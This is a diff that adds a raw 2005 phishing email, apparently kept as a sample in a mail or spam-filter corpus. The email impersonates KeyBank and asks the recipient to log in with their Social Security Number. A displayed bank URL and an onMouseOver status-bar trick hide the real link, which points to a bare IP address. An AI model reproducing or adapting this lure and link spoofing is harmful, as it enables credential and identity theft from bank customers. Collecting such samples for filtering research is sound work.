@@ -1,0 +1,82 @@
+From nobody Sun Jan 25 13:47:53 2015
+Return-Path: <root@verkenners.net>
+X-Original-To: username@login.domain.com
+Delivered-To: username@login.domain.com
+Received: from mail1.domain.com (mail1.domain.com [10.23.1.4])
+ by spanky.domain.com (Postfix) with ESMTP id B001D536E4D
+ for <username@login.domain.com>; Fri, 18 Feb 2005 11:11:16 -0500 (EST)
+Received: from spam.thegeekempire.net (dsl093-012-142.cle1.dsl.speakeasy.net
+ [66.93.12.142])
+ by mail1.domain.com (Postfix) with ESMTP id C615185B025
+ for <username@domain.com>; Fri, 18 Feb 2005 11:02:21 -0500 (EST)
+Received: from verkenners.net (i251191.upc-i.chello.nl [62.195.251.191])
+ by spam.thegeekempire.net (8.10.1/8.9.3) with SMTP id j1IGqdR10831
+ for <username@spam.thegeekempire.net>; Fri, 18 Feb 2005 11:52:43 -0500 (EST)
+Received: (qmail 13432 invoked by uid 0); 18 Feb 2005 13:43:16 -0000
+Date: 18 Feb 2005 13:43:16 -0000
+Message-ID: <20050218134316.13431.qmail@verkenners.net>
+To: username@spam.thegeekempire.net
+Subject: Key Bank Customer Notification [Fri, 18 Feb 2005 08:14 AM +0300]
+From: "security@keybank.com" <security@keybank.com>
+Content-Type: text/html
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 147
+
+
+<html>
+<body>
+<img border="0" src="http://www.keybank.com/gfx/home/key.gif" width="139" height="65">
+<p>&nbsp;&nbsp;
+<p><br>
+</p>
+<p align="left">We recently reviewed your account, and suspect an fraudulent ATM
+&nbsp;<br>
+transaction, procesed without autorization.<br>
+<br>
+Therefore, as a preventative measure, we have temporarily&nbsp;<br>
+limited access to your on-line banking access.<br>
+To restore your account access, please follow the&nbsp; &nbsp;<br>
+steps listed bellow.<br>
+<br>
+1. Login to your Internet Banking account.&nbsp;<br>
+In case you are not enrolled for Internet Banking, you will have<br>
+to use your Social Security Number as your User ID&nbsp;<br>
+and the first 6 digits of Social Security Number as Password, then,&nbsp;<br>
+ fill in all the required information.<br>
+<br>
+<br>
+2. Review your recent account history for any unauthorized&nbsp;<br>
+withdrawals or deposits, and check your account profile to&nbsp;<br>
+make sure no changes have been made. If any unauthorized&nbsp;<br>
+activity has taken place on your account, report this to KeyBank<br>
+staff immediately.<br>
+<br>
+<br>
+To get started, please click the link below:<br>
+<p><a onMouseOver="window.status='https://accounts2.keybank.com/ib2/Controller?requester=signon';return
+true;" 
+href="http://202.153.255.68/.ib2/CheckSession.php?54b41a82dfd8fe23460c460c7354abc7">https://accounts2.keybank.com/ib2/Controller?requester=signon</a></p>
+<p>Thank you for your prompt attention to this matter and thank you for using
+KeyBank!</p>
+
+&nbsp;&nbsp;
+<table>
+  <tr>
+    <td vAlign="top" noWrap align="left" width="370"><small>&nbsp; Key Bank, N.A. Member FDIC.&nbsp;
+      Equal Housing Lender</small></td>
+  </tr>
+  <tr>
+    <td vAlign="top" noWrap align="left"><small>&nbsp; Copyright © 2004 KeyBank,
+      N.A. All rights reserved</small></td>
+  </tr>
+</table>
+&nbsp;
+<p><font size="2" color="#808080">Do not reply to this e-mail as it is an
+unmonitored alias</font></p>
+<p>&nbsp;&nbsp;
+<br>
+<br>
+</body>
+</html>
